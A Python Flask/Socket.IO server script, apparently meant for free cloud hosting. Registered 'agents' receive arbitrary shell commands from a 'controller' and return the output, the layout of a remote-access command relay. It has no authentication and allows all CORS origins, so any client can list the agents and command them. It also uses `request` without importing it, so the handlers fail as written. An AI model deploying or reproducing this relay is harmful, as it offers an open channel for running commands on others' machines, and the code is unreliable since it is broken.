"""
REMOTE ACCESS PUBLIC SERVER
Deploy this on Render.com for free
"""
from flask import Flask, render_template_string
from flask_socketio import SocketIO, emit
import json
import time
import uuid

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")

# Store active connections
agents = {}  # {agent_id: socket_id}
sessions = {}  # {session_id: {agent_id, controller_id}}

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Remote Access Server</title>
    <style>
        body { font-family: Arial; padding: 20px; }
        .status { background: #f0f0f0; padding: 15px; border-radius: 5px; }
        .online { color: green; font-weight: bold; }
        .offline { color: red; }
    </style>
</head>
<body>
    <h1>🚀 Remote Access Server</h1>
    <div class="status">
        <p>Status: <span class="online">● ONLINE</span></p>
        <p>Active Agents: <strong>{{ agents_count }}</strong></p>
        <p>Server Time: {{ time }}</p>
        <p>URL: <code>{{ url }}</code></p>
    </div>
    <p>Use the controller script to connect to your agents.</p>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE,
        agents_count=len(agents),
        time=time.strftime('%H:%M:%S'),
        url=request.host_url
    )

@app.route('/api/status')
def api_status():
    return {
        'status': 'online',
        'agents': list(agents.keys()),
        'timestamp': time.time()
    }

# Socket.IO Events
@socketio.on('connect')
def handle_connect():
    print(f"[+] New connection: {request.sid}")

@socketio.on('agent_register')
def handle_agent_register(data):
    """Agent registration"""
    agent_id = data.get('agent_id', str(uuid.uuid4())[:8])
    agents[agent_id] = request.sid
    
    emit('agent_registered', {'agent_id': agent_id})
    emit('agent_online', {'agent_id': agent_id}, broadcast=True)
    
    print(f"[+] Agent registered: {agent_id}")

@socketio.on('controller_connect')
def handle_controller_connect():
    """Controller connection"""
    emit('controller_connected', {'message': 'Welcome'})

@socketio.on('list_agents')
def handle_list_agents():
    """Send list of online agents"""
    emit('agents_list', {'agents': list(agents.keys())})

@socketio.on('connect_to_agent')
def handle_connect_agent(data):
    """Connect controller to agent"""
    agent_id = data.get('agent_id')
    
    if agent_id in agents:
        # Create session
        session_id = f"sess_{agent_id}_{int(time.time())}"
        sessions[session_id] = {
            'agent_id': agent_id,
            'agent_sid': agents[agent_id],
            'controller_sid': request.sid
        }
        
        # Notify agent
        emit('controller_connecting', {
            'session_id': session_id,
            'controller_id': request.sid
        }, room=agents[agent_id])
        
        # Notify controller
        emit('session_ready', {
            'session_id': session_id,
            'agent_id': agent_id
        })
        
        print(f"[+] Session created: {session_id}")
    else:
        emit('error', {'message': 'Agent not found'})

@socketio.on('agent_accept')
def handle_agent_accept(data):
    """Agent accepts connection"""
    session_id = data.get('session_id')
    
    if session_id in sessions:
        emit('session_active', {
            'session_id': session_id
        }, room=sessions[session_id]['controller_sid'])
        print(f"[+] Session accepted: {session_id}")

@socketio.on('send_command')
def handle_command(data):
    """Forward command to agent"""
    session_id = data.get('session_id')
    command = data.get('command')
    
    if session_id in sessions:
        emit('execute_command', {
            'session_id': session_id,
            'command': command
        }, room=sessions[session_id]['agent_sid'])

@socketio.on('command_result')
def handle_result(data):
    """Forward result to controller"""
    session_id = data.get('session_id')
    output = data.get('output')
    
    if session_id in sessions:
        emit('command_output', {
            'session_id': session_id,
            'output': output
        }, room=sessions[session_id]['controller_sid'])

@socketio.on('disconnect')
def handle_disconnect():
    """Clean up disconnected clients"""
    # Remove agent
    for agent_id, sid in list(agents.items()):
        if sid == request.sid:
            del agents[agent_id]
            emit('agent_offline', {'agent_id': agent_id}, broadcast=True)
            print(f"[-] Agent disconnected: {agent_id}")

if __name__ == '__main__':
    print("=" * 50)
    print("🌐 PUBLIC REMOTE ACCESS SERVER")
    print("=" * 50)
    print("Deploy this on Render.com or PythonAnywhere")
    print("Then use controller.py to access your agents")
    print("=" * 50)
    
    socketio.run(app, host='0.0.0.0', port=5000, allow_unsafe_werkzeug=True)
